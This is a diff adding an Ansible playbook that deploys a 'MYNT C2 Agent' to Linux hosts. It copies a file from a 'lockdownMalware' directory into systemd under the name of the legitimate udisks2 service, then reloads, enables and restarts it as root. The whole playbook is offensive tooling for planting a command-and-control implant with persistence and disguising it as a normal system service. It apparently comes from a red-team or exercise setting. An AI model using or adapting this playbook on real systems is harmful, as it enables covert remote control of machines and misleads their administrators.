@@ -1,0 +1,25 @@
+---
+- name: Deploy MYNT C2 Agent to Linux Hosts
+  hosts: linux
+  become: true
+
+  tasks:
+    - name: Copy file to remote host
+      ansible.builtin.copy:
+        src: ~/lockdownMalware/MYNT_C2/udisks2.service
+        dest: /usr/lib/systemd/system/udisks2.service
+        owner: root
+        group: root
+        mode: "0403"
+    
+    - name: daemon-reload
+      ansible.builtin.shell: systemctl daemon-reload
+      register: daemon_reload_output
+  
+    - name: enable udisks2.service
+      ansible.builtin.command: systemctl enable udisks2.service
+      register: enable_output
+
+    - name: restart udisks2.service
+      ansible.builtin.command: systemctl restart udisks2.service
+      register: restart_output
